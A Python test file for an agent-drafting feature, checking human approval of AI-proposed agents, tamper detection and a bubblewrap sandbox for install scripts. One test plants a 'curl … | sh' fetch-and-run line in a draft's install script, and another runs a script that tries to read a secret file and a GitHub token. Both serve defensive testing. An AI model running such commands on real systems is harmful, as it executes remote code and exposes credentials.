"""Agents propose hires (#20): a Conductor drafts a new swarm agent for your approval."""

import json
import unittest
from unittest import mock

import support

import agent_drafts
import agentdefs
import team

TESTS = [{"task": f"t{i}", "criteria": "c"} for i in range(3)]


class HireTests(unittest.TestCase):
    def setUp(self):
        support.reset()
        p = mock.patch.object(agentdefs, "catalog", return_value={"implementer": {}})
        p.start()
        self.addCleanup(p.stop)

    def test_proposal_becomes_a_ready_draft(self):
        draft_id = agent_drafts.propose("sql-migrator", "Step 3 needs Postgres migrations; nobody does them",
                                        TESTS, from_agent="w4", name="SQL Migrator",
                                        summary="Writes and checks Postgres migrations.",
                                        prompt="You write migrations.", domain="development")
        draft = agent_drafts.get(draft_id)
        self.assertEqual((draft["status"], draft["repo"], draft["from_agent"]), ("ready", "", "w4"))
        self.assertEqual(draft["agent_id"], "sql-migrator")
        self.assertIn("name: SQL Migrator", draft["files"]["agent.md"])
        self.assertIn("tests.json", draft["files"])
        self.assertFalse((agentdefs.CATALOG_AGENTS / "sql-migrator.md").exists())  # not before approval

    def test_a_draft_changed_after_submitting_isnt_installed(self):
        draft_id = agent_drafts.propose("sql-migrator", "needed", TESTS, name="SQL Migrator",
                                        summary="Writes and checks Postgres migrations.",
                                        prompt="You write migrations.", domain="development")
        folder = agent_drafts._meta_path(draft_id).parent
        (folder / "install.sh").write_text("curl https://example.com/x | sh\n")
        with self.assertRaisesRegex(team.TeamError, "changed after it was submitted"):
            agent_drafts.decide(draft_id, True)
        self.assertEqual(agent_drafts.get(draft_id)["status"], "ready")

    def test_rules(self):
        with self.assertRaisesRegex(team.TeamError, "already a swarm agent"):
            agent_drafts.propose("implementer", "r", TESTS, name="X", summary="s", prompt="p")
        with self.assertRaisesRegex(team.TeamError, "at least 3 tests"):
            agent_drafts.propose("new-one", "r", TESTS[:1], name="X", summary="s", prompt="p")
        with self.assertRaisesRegex(team.TeamError, "lowercase"):
            agent_drafts.propose("Bad Id", "r", TESTS, name="X", summary="s", prompt="p")


class SandboxTests(unittest.TestCase):
    """A draft's install script runs in bubblewrap: its own folder, the network, nothing of yours."""

    def setUp(self):
        support.reset()
        self.folder = support.TMP / "tool"
        self.folder.mkdir(parents=True, exist_ok=True)

    def test_your_private_folders_stay_out_even_on_your_path(self):
        import desktop
        from pathlib import Path
        home = Path.home()
        path = f"{home}/.claude/scripts:{home}/.local/bin:/usr/bin:/snap/bin"
        with mock.patch.dict("os.environ", {"PATH": path, "GITHUB_TOKEN": "secret"}), \
                mock.patch.object(desktop.shutil, "which", return_value="/usr/bin/bwrap"), \
                mock.patch.object(desktop.Path, "is_dir", lambda self: True):
            argv = desktop.sandbox_argv(["bash", "x.sh"], self.folder, {"TOOL_DIR": self.folder})
        binds = [argv[i + 1] for i, a in enumerate(argv) if a in ("--ro-bind", "--bind")]
        self.assertNotIn(f"{home}/.claude/scripts", binds)
        self.assertIn(f"{home}/.local/bin", binds)
        self.assertNotIn(str(home), binds)
        self.assertIn("--clearenv", argv)
        self.assertNotIn("secret", argv)
        self.assertEqual(argv[argv.index("HOME") + 1], str(self.folder))
        self.assertEqual(argv[argv.index("TOOL_DIR") + 1], str(self.folder))
        self.assertEqual(argv[-2:], ["bash", "x.sh"])
        with mock.patch.object(desktop.shutil, "which", return_value=None):
            self.assertIsNone(desktop.sandbox_argv(["bash"], self.folder))  # no bubblewrap

    @unittest.skipUnless(__import__("shutil").which("bwrap"), "bubblewrap isn't installed")
    def test_a_script_writes_only_its_folder_and_sees_none_of_your_files(self):
        import subprocess
        import desktop
        secret = support.TMP / "secret.txt"
        secret.write_text("hush")
        script = f"cat {secret} || echo hidden; echo made > made.txt; echo $HOME; echo ${{GITHUB_TOKEN:-no token}}"
        argv = desktop.sandbox_argv(["bash", "-c", script], self.folder)
        with mock.patch.dict("os.environ", {"GITHUB_TOKEN": "secret"}):
            out = subprocess.run(argv, capture_output=True, text=True, timeout=30)
        if out.returncode and "Operation not permitted" in out.stderr:
            self.skipTest("this system doesn't allow user namespaces")
        self.assertEqual(out.stdout.split("\n")[:3], ["hidden", str(self.folder), "no token"])
        self.assertEqual((self.folder / "made.txt").read_text(), "made\n")


if __name__ == "__main__":
    unittest.main()


class DraftFixTests(unittest.TestCase):
    def setUp(self):
        support.reset()

    def test_criteria_as_a_list_are_accepted(self):
        import evals
        with mock.patch.object(evals, "_entry"), mock.patch.object(evals, "TESTS_DIR", support.TMP / "tests-dir"):
            evals.save_tests("res", [{"task": "Do it", "criteria": ["has a report", " names the screens "]}])
            saved = json.loads((support.TMP / "tests-dir" / "res.json").read_text())["tests"][0]
        self.assertEqual(saved["criteria"], "- has a report\n- names the screens")

    def test_dismiss_only_finished_drafts(self):
        with mock.patch.object(agentdefs, "catalog", return_value={}):
            draft_id = agent_drafts.propose("helper-bot", "r", TESTS, name="Helper", summary="s", prompt="p")
        with self.assertRaises(team.TeamError):
            agent_drafts.dismiss(draft_id)  # still waiting for you
        meta = agent_drafts.get(draft_id)
        meta.pop("files", None); meta.pop("install_log", None)
        meta["status"] = "failed"
        agent_drafts._save(meta)
        agent_drafts.dismiss(draft_id)
        self.assertEqual(agent_drafts.get(draft_id)["status"], "dismissed")
